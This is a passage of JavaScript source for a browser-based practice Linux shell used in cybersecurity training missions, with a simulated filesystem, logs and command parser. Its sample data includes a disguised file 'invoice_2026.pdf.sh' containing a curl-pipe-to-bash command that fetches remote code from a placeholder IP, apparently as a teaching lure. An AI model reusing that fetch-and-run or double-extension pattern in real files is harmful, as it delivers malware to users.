/* CyberWithMadhav Learn: a practice Linux shell that runs fully in your browser.
 * Nothing is executed on any real machine and nothing is sent anywhere. Missions are read from a
 * <script type="application/json" class="lx-term-cfg"> block next to each terminal. CSP safe (no eval). */
(function () {
  'use strict';
  var $ = function (s, el) { return (el || document).querySelector(s); };
  var esc = function (s) { return String(s).replace(/[&<>"']/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]; }); };
  var DATE = 'Nov 20 09:41';

  /* SHA-256 (FIPS 180-4), synchronous, for the integrity check missions. */
  var SHA_K = [], SHA_H = [];
  (function () {
    var n = 2, c = 0, frac = function (x) { return ((x - Math.floor(x)) * 4294967296) >>> 0; };
    while (c < 64) { var pr = true; for (var d = 2; d * d <= n; d++) if (n % d === 0) { pr = false; break; } if (pr) { if (c < 8) SHA_H.push(frac(Math.sqrt(n))); SHA_K.push(frac(Math.cbrt(n))); c++; } n++; }
  })();
  function sha256(str) {
    var b = Array.prototype.slice.call(new TextEncoder().encode(str)), l = b.length * 8, H = SHA_H.slice(), w = new Array(64);
    b.push(0x80); while (b.length % 64 !== 56) b.push(0);
    for (var i = 7; i >= 0; i--) b.push(i > 3 ? 0 : (l >>> (i * 8)) & 255);
    var r = function (x, n) { return (x >>> n) | (x << (32 - n)); };
    for (var o = 0; o < b.length; o += 64) {
      for (var t = 0; t < 64; t++) {
        if (t < 16) w[t] = (b[o + t * 4] << 24) | (b[o + t * 4 + 1] << 16) | (b[o + t * 4 + 2] << 8) | b[o + t * 4 + 3];
        else { var s0 = r(w[t - 15], 7) ^ r(w[t - 15], 18) ^ (w[t - 15] >>> 3), s1 = r(w[t - 2], 17) ^ r(w[t - 2], 19) ^ (w[t - 2] >>> 10); w[t] = (w[t - 16] + s0 + w[t - 7] + s1) | 0; }
      }
      var a = H[0], bb = H[1], c = H[2], d = H[3], e = H[4], f = H[5], g = H[6], h = H[7];
      for (t = 0; t < 64; t++) {
        var S1 = r(e, 6) ^ r(e, 11) ^ r(e, 25), ch = (e & f) ^ (~e & g), t1 = (h + S1 + ch + SHA_K[t] + w[t]) | 0;
        var S0 = r(a, 2) ^ r(a, 13) ^ r(a, 22), mj = (a & bb) ^ (a & c) ^ (bb & c), t2 = (S0 + mj) | 0;
        h = g; g = f; f = e; e = (d + t1) | 0; d = c; c = bb; bb = a; a = (t1 + t2) | 0;
      }
      H[0] = (H[0] + a) | 0; H[1] = (H[1] + bb) | 0; H[2] = (H[2] + c) | 0; H[3] = (H[3] + d) | 0; H[4] = (H[4] + e) | 0; H[5] = (H[5] + f) | 0; H[6] = (H[6] + g) | 0; H[7] = (H[7] + h) | 0;
    }
    return H.map(function (x) { return ('00000000' + (x >>> 0).toString(16)).slice(-8); }).join('');
  }
  var UNITS = { 'ssh.service': 'OpenBSD Secure Shell server', 'cron.service': 'Regular background program processing daemon', 'rsyslog.service': 'System Logging Service',
    'systemd-journald.service': 'Journal Service', 'ufw.service': 'Uncomplicated firewall', 'auditd.service': 'Security Auditing Service' };

  /* ---------- sample system ---------- */
  var AUTH = [
    'Nov 20 08:02:11 cwm-lab sshd[812]: Accepted password for student from 192.168.56.1 port 50122 ssh2',
    'Nov 20 08:15:42 cwm-lab sshd[901]: Failed password for root from 203.0.113.45 port 41022 ssh2',
    'Nov 20 08:15:44 cwm-lab sshd[901]: Failed password for root from 203.0.113.45 port 41022 ssh2',
    'Nov 20 08:15:47 cwm-lab sshd[903]: Failed password for invalid user admin from 203.0.113.45 port 41090 ssh2',
    'Nov 20 08:16:02 cwm-lab sshd[910]: Failed password for invalid user oracle from 198.51.100.7 port 60311 ssh2',
    'Nov 20 08:16:05 cwm-lab sshd[903]: Failed password for invalid user admin from 203.0.113.45 port 41090 ssh2',
    'Nov 20 08:17:30 cwm-lab sudo:  student : TTY=pts/0 ; PWD=/home/student ; USER=root ; COMMAND=/usr/bin/apt update',
    'Nov 20 08:20:13 cwm-lab sshd[922]: Failed password for root from 198.51.100.7 port 60390 ssh2',
    'Nov 20 08:21:55 cwm-lab sshd[930]: Failed password for invalid user test from 203.0.113.45 port 41200 ssh2',
    'Nov 20 08:22:01 cwm-lab sshd[931]: Failed password for root from 203.0.113.45 port 41206 ssh2',
    'Nov 20 08:40:18 cwm-lab sshd[960]: Accepted publickey for student from 192.168.56.1 port 50340 ssh2',
    'Nov 20 08:55:09 cwm-lab sshd[977]: Failed password for student from 192.0.2.88 port 52011 ssh2',
    'Nov 20 09:02:44 cwm-lab CRON[990]: pam_unix(cron:session): session opened for user root by (uid=0)'
  ].join('\n') + '\n';
  var PASSWD = ['root:x:0:0:root:/root:/bin/bash', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
    'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', 'sshd:x:110:65534::/run/sshd:/usr/sbin/nologin', 'student:x:1000:1000:Student,,,:/home/student:/bin/bash',
    'backup_svc:x:1001:1001::/home/backup_svc:/bin/bash'].join('\n') + '\n';
  function baseFS() {
    var F = function (c, mode, owner, group) { return { t: 'f', c: c, m: mode || 420, o: owner || 'root', g: group || owner || 'root' }; };
    var D = function (ch, mode, owner, group) { return { t: 'd', ch: ch || {}, m: mode || 493, o: owner || 'root', g: group || owner || 'root' }; };
    var u = 'student';
    return D({
      bin: D({ bash: F('ELF binary', 493), ls: F('ELF binary', 493), cat: F('ELF binary', 493) }),
      boot: D({ 'vmlinuz': F('Linux kernel image', 384) }),
      dev: D({ 'null': F('', 438), sda: F('', 432, 'root', 'disk') }),
      etc: D({
        hostname: F('cwm-lab\n'), passwd: F(PASSWD), group: F('root:x:0:\nsudo:x:27:student\nstudent:x:1000:\n'),
        shadow: F('root:$y$j9T$...:19700:0:99999:7:::\nstudent:$y$j9T$...:19700:0:99999:7:::\n', 416, 'root', 'shadow'),
        'os-release': F('PRETTY_NAME="Ubuntu 24.04 LTS"\nNAME="Ubuntu"\nVERSION_ID="24.04"\nID=ubuntu\nID_LIKE=debian\n'),
        'sudoers': F('root ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n', 288),
        ssh: D({ 'sshd_config': F('Port 22\nPermitRootLogin yes\nPasswordAuthentication yes\n') }),
        'resolv.conf': F('nameserver 127.0.0.53\n'), 'hosts': F('127.0.0.1 localhost\n127.0.1.1 cwm-lab\n'),
        'sysctl.conf': F('# kernel tuning\n'), apt: D({ 'sources.list': F('deb http://archive.ubuntu.com/ubuntu noble main\n') }),
        'ufw': D({ 'ufw.conf': F('ENABLED=no\n') })
      }),
      home: D({
        student: D({
          'notes.txt': F('Lab rules:\n1. Only test machines you own.\n2. Take a VM snapshot before big changes.\n3. Write down every command you learn.\n', 420, u),
          '.bashrc': F('# ~/.bashrc\nalias ll="ls -la"\nexport PATH=$PATH:$HOME/tools\n', 420, u),
          '.mission': F('You found a hidden file. Files that start with a dot are hidden from plain ls.\nNext: make a folder called lab in your home directory.\n', 420, u),
          tools: D({ 'scan.sh': F('#!/bin/bash\n# prints the listening ports on this machine\nss -tuln\n', 420, u) }, 493, u),
          projects: D({ 'README.md': F('# my projects\n', 420, u) }, 493, u),
          downloads: D({ 'invoice_2026.pdf.sh': F('#!/bin/bash\ncurl -s http://198.51.100.7/x | bash\n', 493, u) }, 493, u)
        }, 488, u),
        backup_svc: D({}, 448, 'backup_svc')
      }),
      root: D({ 'flag.txt': F('CWM{r00t_0nly_r34ds_th1s}\n', 384) }, 448),
      tmp: D({}, 1023),
      usr: D({ bin: D({ python3: F('ELF binary', 493), nano: F('ELF binary', 493), ssh: F('ELF binary', 493) }), share: D({}) }),
      'var': D({ log: D({ 'auth.log': F(AUTH, 416, 'syslog', 'adm'), syslog: F('Nov 20 08:00:01 cwm-lab systemd[1]: Started Daily apt download activities.\n', 416, 'syslog', 'adm') }), www: D({ html: D({ 'index.html': F('<h1>It works</h1>\n', 420, 'www-data') }, 493, 'www-data') }) }),
      proc: D({ cpuinfo: F('model name\t: Virtual CPU\ncpu cores\t: 2\n', 292), meminfo: F('MemTotal:        4028760 kB\nMemFree:         2311420 kB\n', 292) })
    });
  }
  var PS = ['USER         PID %CPU %MEM COMMAND', 'root           1  0.0  0.3 /sbin/init', 'root         412  0.0  0.2 /usr/lib/systemd/systemd-journald',
    'syslog       520  0.0  0.1 /usr/sbin/rsyslogd -n', 'root         640  0.0  0.2 sshd: /usr/sbin/sshd -D', 'root         701  0.0  0.1 /usr/sbin/cron -f',
    'www-data     733  0.0  0.4 nginx: worker process', 'student     1201  0.0  0.1 -bash', 'student     1388  0.0  0.0 ps aux'].join('\n');
  var MAN = {
    ls: 'ls: list directory contents. -l long format, -a include hidden files, -h human sizes.', cd: 'cd: change directory. cd .. goes up, cd ~ goes home, cd / goes to the root.',
    pwd: 'pwd: print the full path of the current directory.', cat: 'cat: print file contents.', grep: 'grep: print lines that match a pattern. -i ignore case, -v invert, -c count, -n line numbers.',
    chmod: 'chmod: change permissions. chmod 750 file, or chmod u+x file.', wc: 'wc: count lines (-l), words (-w) and bytes (-c).',
    find: 'find: search for files. find /etc -name "*.conf" or find ~ -type f.', sort: 'sort: sort lines. -n numeric, -r reverse.', uniq: 'uniq: collapse repeated adjacent lines. -c adds counts. Sort first.',
    cut: 'cut: pick columns. cut -d " " -f 11 file.', awk: 'awk: a text-processing language. Here only awk \'{print $N}\' is supported.',
    head: 'head: first lines of a file. head -n 5 file.', tail: 'tail: last lines of a file. tail -n 5 file.', sudo: 'sudo: run one command as root, if you are allowed to.',
    id: 'id: show your user id, group id and groups.', mkdir: 'mkdir: make directories. -p creates parents too.', touch: 'touch: create an empty file or update its time.',
    rm: 'rm: remove files. -r removes folders. There is no recycle bin on Linux.', ps: 'ps: list processes. ps aux shows every process.', echo: 'echo: print text. echo hi > file writes it to a file, >> appends.'
  };

  function Shell(term, cfg) {
    this.term = term; this.cfg = cfg; this.out = $('.lx-term-out', term); this.input = $('input', term); this.label = $('.lx-term-in label', term);
    this.mlist = $('.lx-missions ol', term); this.hist = []; this.hi = 0; this.reset();
    var self = this;
    this.input.addEventListener('keydown', function (e) { self.key(e); });
    $('.lx-term-out', term).addEventListener('click', function () { if (!window.getSelection().toString()) self.input.focus(); });
    var rb = $('[data-reset]', term); if (rb) rb.addEventListener('click', function () { self.reset(); self.input.focus(); });
  }
  Shell.prototype.reset = function () {
    this.fs = baseFS(); this.user = 'student'; this.home = '/home/student'; this.cwd = this.home; this.mi = 0; this.last = { cmd: '', out: '', argv: [] };
    this.vars = {}; this.funcs = {}; this.args = [[]]; this.status = 0; this.readQ = null; this.cap = null; this.depth = 0; this.errQ = []; this.svc = {};
    var files = this.cfg.files || {}, self0 = this;
    Object.keys(files).sort().forEach(function (path) {
      var f = files[path], parts = path.split('/').slice(1), d = self0.fs;
      for (var i = 0; i < parts.length - 1; i++) { if (!d.ch[parts[i]]) d.ch[parts[i]] = { t: 'd', ch: {}, m: 493, o: 'root', g: 'root' }; d = d.ch[parts[i]]; }
      var leaf = parts[parts.length - 1];
      if (f.rm) { delete d.ch[leaf]; return; }
      if (f.d) d.ch[leaf] = d.ch[leaf] || { t: 'd', ch: {}, m: f.m ? parseInt(f.m, 8) : 493, o: f.o || 'root', g: f.g || f.o || 'root' };
      else d.ch[leaf] = { t: 'f', c: f.c || '', m: f.m ? parseInt(f.m, 8) : 420, o: f.o || 'root', g: f.g || f.o || 'root', age: f.age };
    });
    this.out.innerHTML = ''; (this.cfg.intro || []).forEach(function (l) { this.print(l, 'dim'); }, this);
    this.print('Type help to see the commands. Use the Up arrow for history and Tab to complete names.', 'dim');
    this.renderMissions(); this.prompt();
  };
  Shell.prototype.prompt = function () {
    var p = this.cwd === this.home ? '~' : this.cwd.indexOf(this.home + '/') === 0 ? '~' + this.cwd.slice(this.home.length) : this.cwd;
    this.label.innerHTML = esc(this.user + '@cwm-lab') + ':<b>' + esc(p) + '</b>' + (this.user === 'root' ? '#' : '$');
    this.ps = this.label.innerHTML;
  };
  Shell.prototype.print = function (t, cls) {
    var d = document.createElement('div'); if (cls) d.className = cls; d.textContent = t; this.out.appendChild(d); this.out.scrollTop = this.out.scrollHeight;
  };
  Shell.prototype.printHTML = function (h) { var d = document.createElement('div'); d.innerHTML = h; this.out.appendChild(d); this.out.scrollTop = this.out.scrollHeight; };
  Shell.prototype.renderMissions = function () {
    var ms = this.cfg.missions || [], self = this;
    if (!this.mlist) return;
    this.mlist.innerHTML = ms.map(function (m, i) {
      var st = i < self.mi ? 'done' : i === self.mi ? 'cur' : '';
      return '<li class="' + st + '"' + (st === 'cur' ? ' aria-current="step"' : '') + '><span>' + m.t + '</span>' + (st === 'cur' && m.hint ? '<button type="button" data-hint="' + i + '">Hint</button><span class="lx-mhint" hidden>' + m.hint + '</span>' : '') + '</li>';
    }).join('') + (this.mi >= ms.length && ms.length ? '<li class="done">All missions complete. You can keep exploring freely.</li>' : '');
    var hb = $('[data-hint]', this.mlist); if (hb) hb.addEventListener('click', function () { hb.nextElementSibling.hidden = false; hb.remove(); });
    var c = $('.lx-mcount', this.term); if (c) c.textContent = Math.min(this.mi, ms.length) + '/' + ms.length;
  };

  /* ---------- filesystem helpers ---------- */
  Shell.prototype.abs = function (p) {
    if (!p || p === '~') return this.home;
    if (p.indexOf('~/') === 0) p = this.home + p.slice(1);
    var parts = (p[0] === '/' ? p : this.cwd + '/' + p).split('/'), st = [];
    parts.forEach(function (x) { if (!x || x === '.') return; if (x === '..') st.pop(); else st.push(x); });
    return '/' + st.join('/');
  };
  Shell.prototype.node = function (p) { var n = this.fs; if (p === '/') return n; var ps = p.split('/').slice(1); for (var i = 0; i < ps.length; i++) { if (!n || n.t !== 'd') return null; n = n.ch[ps[i]]; } return n || null; };
  Shell.prototype.parent = function (p) { var i = p.lastIndexOf('/'); return { dir: this.node(p.slice(0, i) || '/'), name: p.slice(i + 1) }; };
  Shell.prototype.can = function (n, bit) { /* bit 4 read, 2 write, 1 exec */
    if (this.user === 'root') return true;
    var sh = n.o === this.user ? 6 : ['student', 'adm', 'sudo'].indexOf(n.g) > -1 ? 3 : 0;
    return !!((n.m >> sh) & bit);
  };
  Shell.prototype.err = function (msg) { var e = new Error(msg); e.sh = true; throw e; };
  Shell.prototype.readFile = function (cmd, p) {
    var a = this.abs(p), n = this.node(a);
    if (!n) this.err(cmd + ': ' + p + ': No such file or directory');
    if (n.t === 'd') this.err(cmd + ': ' + p + ': Is a directory');
    if (!this.can(n, 4)) this.err(cmd + ': ' + p + ': Permission denied');
    return n.c;
  };
  Shell.prototype.writeFile = function (cmd, p, text, append) {
    var a = this.abs(p), n = this.node(a);
    if (a === '/dev/null') return;
    if (n && n.t === 'd') this.err(cmd + ': ' + p + ': Is a directory');
    if (n) { if (!this.can(n, 2)) this.err(cmd + ': ' + p + ': Permission denied'); n.c = append ? n.c + text : text; return; }
    var pr = this.parent(a);
    if (!pr.dir || pr.dir.t !== 'd') this.err(cmd + ': ' + p + ': No such file or directory');
    if (!this.can(pr.dir, 2)) this.err(cmd + ': ' + p + ': Permission denied');
    pr.dir.ch[pr.name] = { t: 'f', c: text, m: 436, o: this.user, g: this.user };
  };
  var mstr = function (n) { var s = n.t === 'd' ? 'd' : '-'; for (var i = 6; i >= 0; i -= 3) { var b = (n.m >> i) & 7; s += (b & 4 ? 'r' : '-') + (b & 2 ? 'w' : '-') + (b & 1 ? 'x' : '-'); } if (n.m & 2048) s = s.slice(0, 3) + (n.m & 64 ? 's' : 'S') + s.slice(4); if (n.m & 1024) s = s.slice(0, 6) + (n.m & 8 ? 's' : 'S') + s.slice(7); if (n.m & 512) s = s.slice(0, 9) + (n.m & 1 ? 't' : 'T'); return s; };
  var size = function (n) { return n.t === 'd' ? 4096 : n.c.length; };

  /* ---------- parsing ---------- */
  var PH = function (s) { return String(s).replace(/\u0001/g, '$').replace(/\u0002/g, '*').replace(/\u0003/g, '?'); };
  function tokenize(line) {
    var out = [], cur = '', q = null, has = false;
    for (var i = 0; i < line.length; i++) {
      var c = line[i];
      if (c === '$' && line[i + 1] === '(' && q !== "'") {
        var depth = 0, j = i + 1;
        for (; j < line.length; j++) { if (line[j] === '(') depth++; else if (line[j] === ')') { depth--; if (!depth) break; } }
        if (j >= line.length) throw Object.assign(new Error('bash: unexpected end of input: missing )'), { sh: true });
        cur += line.slice(i, j + 1); has = true; i = j; continue;
      }
      if (q) {
        if (c === q) q = null;
        else cur += q === "'" && c === '$' ? '\u0001' : (c === '*' || c === '?') && q === '"' && cur[cur.length - 1] === '$' ? c : c === '*' ? '\u0002' : c === '?' ? '\u0003' : c;
        continue;
      }
      if (c === '\\' && i + 1 < line.length) { var nx = line[++i]; cur += nx === '$' ? '\u0001' : nx === '*' ? '\u0002' : nx === '?' ? '\u0003' : nx; has = true; continue; }
      if (c === '"' || c === "'") { q = c; has = true; continue; }
      if (c === ' ' || c === '\t') { if (cur || has) out.push(cur); cur = ''; has = false; continue; }
      if (c === '2' && !cur && !has && line[i + 1] === '>') {
        if (line[i + 2] === '&' && line[i + 3] === '1') { out.push({ op: '2>&1' }); i += 3; } else { out.push({ op: '2>' }); i++; }
        continue;
      }
      if (c === '|' || c === ';' || c === '>' || c === '&' || c === '<') {
        if (cur || has) out.push(cur); cur = ''; has = false;
        if (c === '>' && line[i + 1] === '&' && line[i + 2] === '2') { out.push({ op: '>&2' }); i += 2; }
        else if (c === '>' && line[i + 1] === '>') { out.push({ op: '>>' }); i++; }
        else if (c === '&' && line[i + 1] === '&') { out.push({ op: '&&' }); i++; }
        else if (c === '|' && line[i + 1] === '|') { out.push({ op: '||' }); i++; }
        else out.push({ op: c });
        continue;
      }
      cur += c;
    }
    if (q) throw Object.assign(new Error('bash: unexpected end of input: missing closing quote'), { sh: true });
    if (cur || has) out.push(cur);
    return out;
  }

  /* ---------- script parsing: statements, if/elif/else/fi, for/while/done, functions ---------- */
  function splitStmts(text) {
    var st = [], cur = '', q = null, depth = 0;
    var push = function () {
      var t = cur.trim(); cur = ''; if (!t) return;
      var m;
      while ((m = /^(then|do|else|\{)\s+(\S.*)$/.exec(t))) { st.push(m[1]); t = m[2]; }
      if ((m = /^(?:function\s+)?([A-Za-z_]\w*)\s*\(\)\s*\{\s*(.*)$/.exec(t)) || (m = /^function\s+([A-Za-z_]\w*)\s*\{\s*(.*)$/.exec(t))) { st.push('\u0004FUNC ' + m[1]); if (m[2].trim()) st.push(m[2].trim()); return; }
      if ((m = /^(.*\S)\s+\}$/.exec(t)) && !/\$\{[^}]*\}$/.test(t)) { st.push(m[1]); st.push('}'); return; }
      st.push(t);
    };
    for (var i = 0; i < text.length; i++) {
      var c = text[i];
      if (q) { cur += c; if (c === q) q = null; continue; }
      if (c === '"' || c === "'") { q = c; cur += c; continue; }
      if (c === '$' && text[i + 1] === '(') { depth++; cur += '$('; i++; continue; }
      if (c === '(' && depth) { depth++; cur += c; continue; }
      if (c === ')' && depth) { depth--; cur += c; continue; }
      if (c === '#' && !depth && (cur === '' || /\s$/.test(cur))) { while (i < text.length && text[i] !== '\n') i++; push(); continue; }
      if (!depth && (c === '\n' || (c === ';' && text[i + 1] !== ';'))) { push(); continue; }
      cur += c;
    }
    push();
    return st;
  }
  function serr(msg) { return Object.assign(new Error('bash: syntax error: ' + msg), { sh: true }); }
  function parseBlock(st, i, ends) {
    var nodes = [];
    while (i < st.length) {
      var s = st[i], kw = s.split(/\s+/)[0];
      if (ends.indexOf(kw) > -1) return { nodes: nodes, i: i, end: kw, s: s };
      if (kw === 'if') {
        var node = { k: 'if', br: [], els: null }, cond = s.slice(2).trim(); i++;
        for (;;) {
          if (st[i] !== 'then') throw serr("expected 'then' after if or elif");
          var b = parseBlock(st, i + 1, ['elif', 'else', 'fi']); node.br.push({ c: cond, body: b.nodes }); i = b.i;
          if (b.end === 'elif') { cond = b.s.slice(4).trim(); i++; continue; }
          if (b.end === 'else') { var e2 = parseBlock(st, i + 1, ['fi']); if (e2.end !== 'fi') throw serr("missing 'fi'"); node.els = e2.nodes; i = e2.i; }
          if (b.end !== 'fi' && b.end !== 'else') throw serr("missing 'fi'");
          break;
        }
        nodes.push(node); i++; continue;
      }
      var pm = /^(.*[^|\s])\s*\|\s*(while|until)\s+(.*)$/.exec(s);
      if (pm && st[i + 1] === 'do') {
        var pb = parseBlock(st, i + 2, ['done']); if (pb.end !== 'done') throw serr("missing 'done'");
        nodes.push({ k: 'while', neg: pm[2] === 'until', c: pm[3].trim(), body: pb.nodes, rd: null, pre: pm[1].trim() });
        i = pb.i + 1; continue;
      }
      if (kw === 'for' || kw === 'while' || kw === 'until') {
        var fm = kw === 'for' ? /^for\s+([A-Za-z_]\w*)(?:\s+in\s+(.*))?$/.exec(s) : null;
        if (kw === 'for' && !fm) throw serr('bad for loop, use: for x in a b c; do ...; done');
        if (st[i + 1] !== 'do') throw serr("expected 'do'");
        var lb = parseBlock(st, i + 2, ['done']); if (lb.end !== 'done') throw serr("missing 'done'");
        var rd = /^done\s*<\s*(\S+)$/.exec(lb.s);
        nodes.push(kw === 'for' ? { k: 'for', v: fm[1], list: fm[2] == null ? '"$@"' : fm[2], body: lb.nodes } : { k: 'while', neg: kw === 'until', c: s.slice(kw.length).trim(), body: lb.nodes, rd: rd ? rd[1] : null });
        i = lb.i + 1; continue;
      }
      if (s.indexOf('\u0004FUNC ') === 0) {
        var fb = parseBlock(st, i + 1, ['}']); if (fb.end !== '}') throw serr("missing '}' at the end of the function");
        nodes.push({ k: 'func', name: s.slice(6), body: fb.nodes }); i = fb.i + 1; continue;
      }
      if (['then', 'do', 'done', 'fi', 'else', 'elif', '}'].indexOf(kw) > -1) throw serr("unexpected '" + kw + "'");
      nodes.push({ k: 'cmd', s: s }); i++;
    }
    return { nodes: nodes, i: i, end: null };
  }

  Shell.prototype.key = function (e) {
    var self = this;
    if (e.key === 'Enter') { var v = this.input.value; this.input.value = ''; this.run(v); }
    else if (e.key === 'ArrowUp') { if (this.hi > 0) { this.hi--; this.input.value = this.hist[this.hi]; } e.preventDefault(); }
    else if (e.key === 'ArrowDown') { if (this.hi < this.hist.length) { this.hi++; this.input.value = this.hist[this.hi] || ''; } e.preventDefault(); }
    else if (e.key === 'Tab') {
      e.preventDefault();
      var v2 = this.input.value, m = v2.match(/(\S*)$/), part = m[1], slash = part.lastIndexOf('/');
      var dirp = slash > -1 ? part.slice(0, slash + 1) : '', base = part.slice(slash + 1), d = this.node(this.abs(dirp || '.'));
      if (!d || d.t !== 'd') return;
      var hits = Object.keys(d.ch).filter(function (k) { return k.indexOf(base) === 0 && (base[0] === '.' || k[0] !== '.'); });
      if (hits.length === 1) { var n = d.ch[hits[0]]; this.input.value = v2.slice(0, v2.length - part.length) + dirp + hits[0] + (n.t === 'd' ? '/' : ' '); }
      else if (hits.length > 1) { this.printHTML('<span class="pr">' + this.ps + '</span> ' + esc(v2)); this.print(hits.join('  ')); }
    } else if (e.key === 'l' && e.ctrlKey) { e.preventDefault(); self.out.innerHTML = ''; }
  };

  Shell.prototype.run = function (line) {
    this.printHTML('<span class="pr">' + this.ps + '</span> ' + esc(line));
    line = line.slice(0, 600).trim();
    if (!line) return;
    this.hist.push(line); this.hi = this.hist.length;
    this.runOut = []; this.budget = 3000; this.cap = null; this.depth = 0;
    try { this.execText(line); }
    catch (e) { if (e.exitSig) this.print('This practice shell stays open. Use the Reset button to start fresh.', 'dim'); else if (e.sh) this.print(e.message, 'er'); else throw e; }
    this.last.cmd = line; this.last.out = this.runOut.join('\n').trim();
    if (this.user === 'root' && this.sudoOnce) { this.user = 'student'; this.sudoOnce = false; }
    this.prompt(); this.check(line);
  };
  Shell.prototype.emit = function (txt, dirs) {
    if (this.cap) { this.cap.push(txt); return; }
    this.runOut.push(txt);
    if (dirs && dirs.length) this.printHTML(esc(txt).replace(new RegExp('(^|\\s)(' + dirs.map(function (d) { return esc(d).replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); }).join('|') + ')(?=\\s|$)', 'gm'), '$1<span class="dir">$2</span>'));
    else this.print(txt);
  };
  Shell.prototype.execText = function (text) {
    var b = parseBlock(splitStmts(text), 0, []);
    if (b.end) throw serr("unexpected '" + b.end + "'");
    this.execNodes(b.nodes);
  };
  Shell.prototype.execNodes = function (nodes) {
    for (var i = 0; i < nodes.length; i++) {
      if (--this.budget < 0) throw Object.assign(new Error('bash: stopped: too many steps (is a loop running forever?)'), { sh: true });
      var n = nodes[i], self = this;
      if (n.k === 'cmd') this.status = this.execSimple(n.s);
      else if (n.k === 'func') { this.funcs[n.name] = n.body; this.status = 0; }
      else if (n.k === 'if') {
        var hit = false;
        for (var j = 0; j < n.br.length && !hit; j++) if (this.execSimple(n.br[j].c) === 0) { hit = true; this.execNodes(n.br[j].body); }
        if (!hit && n.els) this.execNodes(n.els);
      } else if (n.k === 'for') {
        var words = [];
        tokenize(n.list).forEach(function (t) { if (typeof t !== 'string') return; self.globs(self.expand(t)).forEach(function (w) { (/\s/.test(w) && !/^"/.test(t) ? w.split(/\s+/).filter(Boolean) : [w]).forEach(function (x) { words.push(PH(x)); }); }); });
        for (var k = 0; k < words.length; k++) { if (--this.budget < 0) throw Object.assign(new Error('bash: stopped: too many loop rounds'), { sh: true }); this.vars[n.v] = words[k]; this.execNodes(n.body); }
      } else if (n.k === 'while') {
        var savedQ = this.readQ;
        if (n.rd) { var src = this.readFile('bash', PH(this.expand(n.rd))); this.readQ = src.split('\n'); if (this.readQ[this.readQ.length - 1] === '') this.readQ.pop(); }
        else if (n.pre != null) { var pout = this.capture(n.pre); this.readQ = pout ? pout.split('\n') : []; }
        for (;;) {
          if (--this.budget < 0) throw Object.assign(new Error('bash: stopped: too many loop rounds (is the condition ever false?)'), { sh: true });
          var st = this.execSimple(n.c); if (n.neg ? st === 0 : st !== 0) break;
          this.execNodes(n.body);
        }
        this.readQ = savedQ; this.status = 0;
      }
    }
  };
  Shell.prototype.execSimple = function (line) {
    var toks = tokenize(line), self = this, groups = [[]], seps = [];
    toks.forEach(function (t) { if (t.op === ';' || t.op === '&&' || t.op === '||') { seps.push(t.op); groups.push([]); } else groups[groups.length - 1].push(t); });
    var st = 0;
    for (var g = 0; g < groups.length; g++) {
      if (g > 0 && ((seps[g - 1] === '&&' && st !== 0) || (seps[g - 1] === '||' && st === 0))) continue;
      if (!groups[g].length) continue;
      var neg = groups[g][0] === '!'; if (neg) groups[g] = groups[g].slice(1);
      st = this.pipeline(groups[g]); if (neg) st = st === 0 ? 1 : 0;
    }
    this.status = st; return st;
  };
  Shell.prototype.getVar = function (n) {
    var a = this.args[this.args.length - 1] || [];
    if (/^\d+$/.test(n)) return +n === 0 ? (this.script0 || 'bash') : (a[+n - 1] || '');
    if (n === '#') return String(a.length);
    if (n === '@' || n === '*') return a.join(' ');
    if (n === '?') return String(this.status || 0);
    if (n === 'HOME') return this.home; if (n === 'USER') return this.user; if (n === 'PWD') return this.cwd; if (n === 'HOSTNAME') return 'cwm-lab'; if (n === 'SHELL') return '/bin/bash';
    if (n === 'RANDOM') return String(Math.floor(Math.random() * 32768));
    return this.vars[n] != null ? this.vars[n] : '';
  };
  Shell.prototype.capture = function (text) {
    var saved = this.cap, savedSt = this.status; this.cap = [];
    try { this.execText(text); } catch (e) { if (!e.exitSig) { this.cap = saved; throw e; } }
    var r = this.cap.join('\n'); this.cap = saved; return r.replace(/\n+$/, '');
  };
  Shell.prototype.expand = function (w) {
    var self = this, out = '', i = 0;
    while (i < w.length) {
      if (w[i] === '$' && w[i + 1] === '(') {
        var depth = 0, j = i + 1; for (; j < w.length; j++) { if (w[j] === '(') depth++; else if (w[j] === ')') { depth--; if (!depth) break; } }
        var inner = w.slice(i + 2, j);
        if (inner[0] === '(' && inner[inner.length - 1] === ')') out += String(this.arith(inner.slice(1, -1)));
        else out += this.capture(inner);
        i = j + 1; continue;
      }
      out += w[i]; i++;
    }
    return out.replace(/\$\{#([A-Za-z_]\w*)\}|\$\{([A-Za-z_]\w*|\d+)(:?[-=+])([^}]*)\}|\$\{([A-Za-z_]\w*|\d+|[@#?*])\}|\$([A-Za-z_]\w*|\d|[@#?*])/g, function (m, ln, v, op, dv, a, b) {
      if (ln) return String(self.getVar(ln).length);
      if (v) {
        var cur = self.getVar(v), set = op[0] === ':' ? cur !== '' : (self.vars[v] != null || /^\d+$/.test(v) && cur !== '' || /^(HOME|USER|PWD|HOSTNAME|SHELL)$/.test(v)), o = op.slice(-1);
        if (o === '+') return set ? dv : '';
        if (set) return cur;
        if (o === '=' && !/^\d+$/.test(v)) self.vars[v] = dv;
        return dv;
      }
      return self.getVar(a || b);
    });
  };
  Shell.prototype.globs = function (w) {
    if (!/[*?]/.test(w)) return [w];
    var slash = w.lastIndexOf('/'), dir = slash > -1 ? w.slice(0, slash) || '/' : '.', pat = w.slice(slash + 1), d = this.node(this.abs(dir));
    if (/[*?]/.test(dir) || !d || d.t !== 'd' || !this.can(d, 4)) return [w];
    var rx = new RegExp('^' + pat.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*').replace(/\?/g, '.') + '$');
    var hits = Object.keys(d.ch).sort().filter(function (k) { return rx.test(k) && (pat[0] === '.' || k[0] !== '.'); });
    return hits.length ? hits.map(function (k) { return slash > -1 ? w.slice(0, slash + 1) + k : k; }) : [w];
  };
  Shell.prototype.arith = function (ex) {
    var self = this, m;
    ex = PH(ex).trim();
    if ((m = /^([A-Za-z_]\w*)\s*(\+\+|--)$/.exec(ex))) { var v0 = parseInt(this.vars[m[1]] || '0', 10) || 0; this.vars[m[1]] = String(m[2] === '++' ? v0 + 1 : v0 - 1); return v0; }
